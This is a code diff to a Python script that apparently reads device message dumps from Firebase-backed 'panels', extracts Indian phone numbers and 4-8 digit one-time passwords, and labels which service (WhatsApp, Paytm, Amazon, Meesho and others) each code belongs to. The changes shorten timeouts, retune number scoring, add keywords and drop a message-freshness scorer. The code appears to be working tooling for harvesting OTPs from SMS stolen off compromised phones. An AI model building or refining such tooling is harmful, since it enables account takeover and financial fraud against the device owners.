@@ -3,10 +3,10 @@ from collections import Counter
 
 async def fetch_fb(url, auth=None):
     full_url = url
-    if auth: full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
+    if auth: full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(full_url, timeout=8) as resp:
+            async with session.get(full_url, timeout=3) as resp: # 3s Fast Timeout
                 if resp.status == 200:
                     txt = await resp.text()
                     if txt == "null" or not txt: return {}
@@ -39,27 +39,6 @@ def decode_panel_url(panel_url):
     except Exception: pass
     return None
 
-def calculate_health(msgs):
-    if not msgs: return 1 
-    latest_time = 0
-    for m in msgs:
-        m_id = m.get("id", 0)
-        if isinstance(m_id, (int, float)) and m_id > 100000000000: 
-            if m_id > latest_time: latest_time = m_id / 1000
-        elif isinstance(m_id, str) and m_id.isdigit() and len(m_id) > 12:
-            if int(m_id)/1000 > latest_time: latest_time = int(m_id)/1000
-        m_time = m.get("time", 0)
-        if isinstance(m_time, (int, float)) and m_time > 100000000000:
-            if m_time/1000 > latest_time: latest_time = m_time/1000
-            
-    if latest_time == 0: return 5 
-    diff_hours = (time.time() - latest_time) / 3600
-    if diff_hours < 0.5: return 10
-    if diff_hours < 2: return 8
-    if diff_hours < 6: return 6
-    if diff_hours < 12: return 4
-    return 2
-
 def extract_best_numbers(dev_data, msgs):
     all_text = " ".join([m.get("message", "") for m in msgs])
     matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_text)
@@ -70,16 +49,15 @@ def extract_best_numbers(dev_data, msgs):
     scored_numbers = []
     
     for num, count in counts.items():
-        score = min(count * 10, 50) 
+        score = min(count * 15, 60) 
         is_carrier = False
         for m in msgs:
             sender = str(m.get("sender", "")).lower()
             if num in m.get("message", "") and any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                 is_carrier = True
                 break
-        
         if is_carrier: score = 100 
-        else: score = min(score + 20, 99)
+        else: score = min(score + 20, 95) 
         scored_numbers.append((num, score))
 
     for key in ["phoneNumber", "phone", "number", "mobile"]:
@@ -93,13 +71,13 @@ def extract_best_numbers(dev_data, msgs):
     return sorted(best_nums.items(), key=lambda x: x[1], reverse=True)[:2]
 
 def extract_otp(text):
-    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]): return None
+    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password", "sign-in"]): return None
     match = re.search(r'\b(\d{4,8})\b', text)
     return match.group(1) if match else None
 
 def extract_service_name(text, sender):
     text_lower = text.lower()
-    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel"}
+    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho"}
     for key, name in services.items():
         if key in text_lower: return name
     if sender and "-" in sender: return sender.split("-")[1]
